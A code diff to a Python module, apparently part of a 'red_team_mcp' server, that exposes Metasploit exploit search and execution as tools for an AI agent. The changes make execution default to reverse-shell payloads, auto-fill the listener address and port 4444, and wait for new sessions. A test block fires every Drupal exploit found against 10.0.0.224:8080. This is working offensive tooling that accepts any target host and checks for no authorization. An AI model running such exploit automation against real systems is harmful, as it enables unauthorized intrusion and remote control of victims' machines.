@@ -9,10 +9,12 @@ Uses pymetasploit3 library to communicate with Metasploit RPC server.
 import json
 import uuid
 from datetime import datetime
+from pprint import pprint
 from typing import Annotated, Dict, List, Optional, Any
 import logging
 
 from red_team_mcp import database
+import socket
 
 logger = logging.getLogger(__name__)
 
@@ -137,16 +139,16 @@ def get_metasploit_client():
 def list_exploits_internal(
     platform: str = "",
     search_term: str = "",
+    cve: str = "",
     limit: int = 50
 ) -> Dict[str, Any]:
     """
     List available Metasploit exploits with optional filtering.
 
-    This function now uses the fast database search instead of slow RPC queries.
-
     Args:
-        platform: Filter by platform (e.g., 'windows', 'linux', 'unix')
+        platform: Filter by platform (e.g., 'windows', 'linux', 'unix') leave blank for all platforms
         search_term: Search term to filter exploits
+        cve: CVE to filter exploits
         limit: Maximum number of exploits to return
 
     Returns:
@@ -157,30 +159,24 @@ def list_exploits_internal(
         start_time = datetime.now()
 
         # Create initial scan record
-        database.create_scan_record(scan_id, "metasploit-list", "list-exploits", "metasploit", start_time)
 
-        print(f"🚀 DEBUG: Listing exploits using fast database search - platform='{platform}', search='{search_term}', limit={limit}")
+        print(f"🚀 DEBUG: Listing exploits using fast database search - platform='{platform}', search='{search_term}', limit={limit}, cve={cve}")
 
-        # Check if exploits database is populated
-        exploits_count = database.get_exploits_count()
-        if exploits_count == 0:
-            print("⚠️  WARNING: Exploits database is empty. Run populate_exploits.py first for best results.")
-            print("🔄 Falling back to slow RPC method...")
-
-            # Fallback to RPC method if database is empty
-            return list_exploits_rpc_fallback(platform, search_term, limit, scan_id, start_time)
-
-        print(f"📊 DEBUG: Using fast database search with {exploits_count} cached exploits")
-
-        # Use the fast database search
         db_result = database.search_exploits_database(
             platform=platform or None,
             search_term=search_term or None,
-            cve=None,  # CVE search is handled in search_term
-            rank=None,
-            author=None,
+            cve=cve or None,  # CVE search is handled in search_term
             limit=limit
         )
+
+        if not len(db_result['exploits']):
+            db_result = database.search_exploits_database(
+                platform=None,
+                search_term=search_term or None,
+                cve=cve or None,  # CVE search is handled in search_term
+                limit=limit
+            )
+
 
         if not db_result["success"]:
             raise Exception(f"Database search failed: {db_result.get('error', 'Unknown error')}")
@@ -234,7 +230,6 @@ def list_exploits_internal(
         return {
             "success": True,
             "scan_id": scan_id,
-            "total_exploits": exploits_count,
             "filtered_exploits": len(filtered_exploits),
             "exploits": filtered_exploits,
             "filters_applied": {
@@ -255,121 +250,11 @@ def list_exploits_internal(
         }
 
 
-def list_exploits_rpc_fallback(platform: str, search_term: str, limit: int, scan_id: str, start_time) -> Dict[str, Any]:
-    """
-    Fallback RPC method for listing exploits when database is not populated.
-    This is the old slow method kept for compatibility.
-    """
-    try:
-        # Get Metasploit client
-        client = get_metasploit_client()
-
-        print(f"🐌 DEBUG: Using slow RPC fallback method...")
-
-        # Get all available exploits
-        all_exploits = client.modules.exploits
-        print(f"📊 DEBUG: Found {len(all_exploits)} total exploits via RPC")
-
-        # Filter exploits using basic approach
-        filtered_exploits = []
-
-        for exploit_name in all_exploits:
-            # Basic filtering by platform
-            if platform and not exploit_name.lower().startswith(platform.lower()):
-                continue
-
-            # Basic filtering by search term
-            if search_term and search_term.lower() not in exploit_name.lower():
-                continue
-
-            # Create basic exploit info
-            exploit_info = {
-                "name": exploit_name,
-                "description": f"Metasploit exploit module: {exploit_name}",
-                "rank": "Unknown",
-                "targets": [],
-                "required_options": [],
-                "all_options": [],
-                "references": [],
-                "cves": [],
-                "data_source": "rpc_fallback"
-            }
-
-            filtered_exploits.append(exploit_info)
-
-            # Respect limit
-            if len(filtered_exploits) >= limit:
-                break
-
-        end_time = datetime.now()
-        duration = (end_time - start_time).total_seconds()
-
-        # Store results in database
-        results_json = json.dumps({
-            "exploits": filtered_exploits,
-            "filters": {
-                "platform": platform,
-                "search_term": search_term,
-                "limit": limit
-            }
-        })
-
-        database.update_scan_status(
-            scan_id,
-            "completed",
-            end_time,
-            duration,
-            1,
-            len(filtered_exploits),
-            results_json
-        )
-
-        print(f"🎯 DEBUG: RPC fallback found {len(filtered_exploits)} exploits (took {duration:.2f}s)")
-
-        return {
-            "success": True,
-            "scan_id": scan_id,
-            "total_exploits": len(all_exploits),
-            "filtered_exploits": len(filtered_exploits),
-            "exploits": filtered_exploits,
-            "filters_applied": {
-                "platform": platform or "none",
-                "search_term": search_term or "none",
-                "limit": limit
-            },
-            "duration_seconds": duration,
-            "message": f"Found {len(filtered_exploits)} exploits matching criteria (RPC fallback - consider populating database)",
-            "search_method": "rpc_fallback"
-        }
-
-    except Exception as e:
-        end_time = datetime.now()
-        duration = (end_time - start_time).total_seconds() if 'start_time' in locals() else 0
-
-        database.update_scan_status(
-            scan_id,
-            "failed",
-            end_time,
-            duration,
-            0,
-            0,
-            "",
-            str(e)
-        )
-
-        return {
-            "success": False,
-            "error": str(e),
-            "scan_id": scan_id
-        }
-
 def execute_exploit_internal(
     exploit_name: str,
     target_host: str,
     target_port: int = None,
     payload: str = "",
-    exploit_options: Dict[str, str] = None,
-    payload_options: Dict[str, str] = None
 ) -> Dict[str, Any]:
     """
     Execute a Metasploit exploit against a target.
@@ -388,26 +273,18 @@ def execute_exploit_internal(
     try:
         scan_id = str(uuid.uuid4())
         start_time = datetime.now()
+  # Get Metasploit client
 
-        # Get Metasploit client
-        print(f"🔧 DEBUG: Getting Metasploit client...")
         client = get_metasploit_client()
-        print(f"✅ DEBUG: Metasploit client connected")
-
         # Create initial scan record
-        print(f"🔧 DEBUG: Creating scan record...")
-        database.create_scan_record(scan_id, target_host, "exploit", "metasploit", start_time)
-        print(f"✅ DEBUG: Scan record created")
 
-        print(f"🚀 DEBUG: Executing exploit {exploit_name} against {target_host}")
+        print(f"🚀 DEBUG: Executing exploit {exploit_name} against {target_host}:{target_port}")
 
-        # Load the exploit module
-        print(f"🔧 DEBUG: Loading exploit module: {exploit_name}")
+
         try:
             exploit = client.modules.use('exploit', exploit_name)
             if not exploit:
                 raise Exception(f"Failed to load exploit module: {exploit_name}")
-            print(f"✅ DEBUG: Exploit module loaded successfully")
         except Exception as module_error:
             print(f"❌ DEBUG: Error loading exploit module: {module_error}")
             # Check if it's the integer key error
@@ -426,18 +303,20 @@ def execute_exploit_internal(
             exploit['RPORT'] = target_port
 
         # Set additional exploit options
-        if exploit_options:
-            for key, value in exploit_options.items():
-                exploit[key] = value
-                print(f"🔧 DEBUG: Set exploit option {key} = {value}")
 
         # Determine payload
         if not payload:
             # Get available payloads and use the first one
             available_payloads = exploit.targetpayloads()
             if available_payloads:
-                payload = available_payloads[0]
-                print(f"🎯 DEBUG: Using default payload: {payload}")
+                # find the first reverse
+                reverse_payloads = [payload for payload in available_payloads if 'reverse' in payload]
+                if reverse_payloads:
+                    payload = reverse_payloads[0]
+                    print(f"🎯 DEBUG: Using default payload: {payload}")
+                else:
+                    print(f"DEBUG: No reverse payload found for {exploit_name}")
+
             else:
                 raise Exception("No compatible payloads found for this exploit")
 
@@ -445,19 +324,59 @@ def execute_exploit_internal(
         payload_obj = None
         if payload:
             payload_obj = client.modules.use('payload', payload)
-            if payload_obj and payload_options:
-                for key, value in payload_options.items():
-                    payload_obj[key] = value
-                    print(f"🔧 DEBUG: Set payload option {key} = {value}")
+            if payload_obj:
+
+
+                if "LHOST" not in payload_obj:
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        s.connect(("8.8.8.8", 80))
+                        local_ip = s.getsockname()[0]
+                        s.close()
+                        payload_obj["LHOST"] = local_ip
+                        print(f"🔧 DEBUG: Auto-detected fallback LHOST = {local_ip}")
+                    except Exception as e:
+                        print(f"⚠️  DEBUG: LHOST not set and auto-detect failed — reverse shell may fail: {e}")
+                if "LPORT" not in payload_obj:
+                    payload_obj["LPORT"] = "4444"
+                    print("🔧 DEBUG: Set payload fallback LPORT = 4444")
+
+                print(f"📡 DEBUG: Handler should now be listening on {payload_obj['LHOST'] if 'LHOST' in payload_obj else 'unknown'}:{payload_obj['LPORT'] if 'LPORT' in payload_obj else 'unknown'}")
 
         # Check for missing required options
         missing_options = exploit.missing_required
         if missing_options:
             raise Exception(f"Missing required exploit options: {missing_options}")
 
+        # Optional: Run the check method to see if target is likely vulnerable
+        try:
+            print("🔍 DEBUG: Running vulnerability check...")
+            check_result = exploit.check() if callable(exploit.check) else exploit.check
+            print(f"✅ DEBUG: Check result: {check_result}")
+        except Exception as check_error:
+            print(f"⚠️  DEBUG: Check failed: {check_error}")
+            check_result = f"Check failed: {str(check_error)}"
+
         # Execute the exploit
         print(f"🚀 DEBUG: Launching exploit...")
         result = exploit.execute(payload=payload_obj if payload_obj else payload)
+        # Wait for new session
+        print("⏳ DEBUG: Waiting for session to connect...")
+        max_wait = 10  # seconds
+        poll_interval = 1
+        initial_sessions = set(client.sessions.list.keys())
+
+        import time
+        for i in range(max_wait):
+            time.sleep(poll_interval)
+            current_sessions = set(client.sessions.list.keys())
+            new_sessions = current_sessions - initial_sessions
+            if new_sessions:
+                print(f"✅ DEBUG: New session(s) detected: {new_sessions}")
+                break
+        else:
+            print("⌛ DEBUG: No new session after waiting.")
+        print(f"<UNK> result: {result}")
 
         # Convert result to handle integer keys immediately
         result = convert_int_keys_to_str(result) if result else {}
@@ -480,6 +399,13 @@ def execute_exploit_internal(
             sessions = {}
             session_count = 0
 
+        # Compute vulnerable field
+        vulnerable = bool(
+            session_count > 0
+            or (isinstance(check_result, str) and "vulnerable" in check_result.lower())
+            or check_result is True
+        )
+
         end_time = datetime.now()
         duration = (end_time - start_time).total_seconds()
 
@@ -493,7 +419,9 @@ def execute_exploit_internal(
             "exploit_uuid": exploit_uuid,
             "sessions_created": session_count,
             "sessions": sessions,
-            "execution_result": result
+            "execution_result": result,
+            "check_result": check_result,
+            "vulnerable": vulnerable,
         }
 
         # Convert integer keys to strings to avoid JSON serialization errors
@@ -526,7 +454,9 @@ def execute_exploit_internal(
             "sessions_created": session_count,
             "sessions": sessions,
             "duration_seconds": duration,
-            "message": f"Exploit executed against {target_host} - Job ID: {job_id}, Sessions created: {session_count}"
+            "message": f"Exploit executed against {target_host}:{target_port} - Job ID: {job_id}, Sessions created: {session_count}",
+            "check_result": check_result,
+            "vulnerable": vulnerable,
         }
 
         # Convert integer keys to strings to avoid JSON serialization errors
@@ -561,12 +491,10 @@ def register_tools(app):
     """Register all Metasploit tools with the FastMCP app."""
 
     @app.tool()
-    async def search_exploits_fast(
+    async def search_exploits(
         platform: Annotated[str, "Filter by platform (e.g., 'windows', 'linux', 'unix'). Leave empty for all platforms."] = "",
         search_term: Annotated[str, "Search term to filter exploits by name or description. Leave empty for no filtering."] = "",
         cve: Annotated[str, "Search for specific CVE reference (e.g., 'CVE-2017-0144'). Leave empty for no CVE filtering."] = "",
-        rank: Annotated[str, "Filter by exploit rank (e.g., 'excellent', 'great', 'good'). Leave empty for all ranks."] = "",
-        author: Annotated[str, "Filter by author name. Leave empty for all authors."] = "",
         limit: Annotated[int, "Maximum number of exploits to return"] = 50
     ) -> str:
         """
@@ -584,10 +512,11 @@ def register_tools(app):
         Note: The exploits database must be populated first using the populate_exploits.py script.
 
         Examples:
+        - Drupal exploits: search_term='drupal'
         - Windows SMB exploits: platform='windows', search_term='smb'
         - EternalBlue exploit: cve='CVE-2017-0144'
         - High-quality exploits: rank='excellent'
-        - Exploits by specific author: author='hdm'
+
         """
         # Run the blocking database operation in a thread pool
         import asyncio
@@ -596,39 +525,11 @@ def register_tools(app):
             platform=platform or None,
             search_term=search_term or None,
             cve=cve or None,
-            rank=rank or None,
-            author=author or None,
             limit=limit
         )
         # Convert any datetime objects to strings to avoid JSON serialization errors
         result = convert_int_keys_to_str(result)
-        return format_tool_response(result["success"], result, result.get("error", ""))
-
-    @app.tool()
-    async def list_exploits(
-        platform: Annotated[str, "Filter by platform (e.g., 'windows', 'linux', 'unix'). Leave empty for all platforms."] = "",
-        search_term: Annotated[str, "Search term to filter exploits by name or description. Leave empty for no filtering."] = "",
-        limit: Annotated[int, "Maximum number of exploits to return"] = 50
-    ) -> str:
-        """
-        List available Metasploit exploits with optional filtering.
-
-        This tool connects to the Metasploit RPC server and retrieves a list of available
-        exploit modules. Results can be filtered by platform and search terms.
-
-        Use this tool when you want to:
-        - Discover available exploits for a specific platform
-        - Search for exploits related to specific services or vulnerabilities
-        - Get exploit details including required options and targets
-
-        Examples:
-        - All Windows exploits: platform='windows', search_term='', limit=50
-        - SMB exploits: platform='', search_term='smb', limit=20
-        - Apache exploits: platform='linux', search_term='apache', limit=10
-        """
-        # Run the blocking list_exploits_internal function in a thread pool
-        import asyncio
-        result = await asyncio.to_thread(list_exploits_internal, platform, search_term, limit)
+        print(f"Search Exploit res: {result}")
         return format_tool_response(result["success"], result, result.get("error", ""))
 
     @app.tool()
@@ -637,8 +538,6 @@ def register_tools(app):
         target_host: Annotated[str, "Target host IP address or hostname"],
         target_port: Annotated[int, "Target port number (if required by the exploit)"] = None,
         payload: Annotated[str, "Payload to use (leave empty for default payload)"] = "",
-        exploit_options: Annotated[str, "Additional exploit options as JSON string (e.g., '{\"LHOST\": \"192.168.1.100\"}')"] = "{}",
-        payload_options: Annotated[str, "Additional payload options as JSON string (e.g., '{\"LPORT\": \"4444\"}')"] = "{}"
     ) -> str:
         """
         Execute a Metasploit exploit against a target host.
@@ -653,25 +552,29 @@ def register_tools(app):
 
         Examples:
         - Basic exploit: exploit_name='unix/ftp/vsftpd_234_backdoor', target_host='192.168.1.100'
-        - With options: exploit_name='windows/smb/ms17_010_eternalblue', target_host='10.0.0.1', target_port=445
         - Custom payload: exploit_name='linux/http/apache_mod_cgi_bash_env_exec', target_host='web.example.com', payload='linux/x86/meterpreter/reverse_tcp'
         """
-        try:
-            # Parse JSON options
-            exploit_opts = json.loads(exploit_options) if exploit_options.strip() else {}
-            payload_opts = json.loads(payload_options) if payload_options.strip() else {}
-        except json.JSONDecodeError as e:
-            return format_tool_response(False, {}, f"Invalid JSON in options: {str(e)}")
 
         # Run the blocking execute_exploit_internal function in a thread pool
         import asyncio
         result = await asyncio.to_thread(
             execute_exploit_internal,
-            exploit_name, target_host, target_port, payload, exploit_opts, payload_opts
+            exploit_name, target_host, target_port, payload
         )
         return format_tool_response(result["success"], result, result.get("error", ""))
 
-
 if __name__ == "__main__":
     # Test the tools directly
-    print(list_exploits_internal("windows", "smb", 5))
+    #pprint(list_exploits_internal(cve="CVE-2018-7600"))
+    res = list_exploits_internal(search_term="Drupal")
+
+    for exploit in res.get("exploits", []):
+        print(exploit)
+        res = execute_exploit_internal(exploit.get("name"), '10.0.0.224', 8080)
+        print(res)
+    # res = execute_exploit_internal('unix/webapp/drupal_drupalgeddon2',
+    #                                '10.0.0.224',
+    #                                8080
+    #
+    #                                )
+    # print(res)
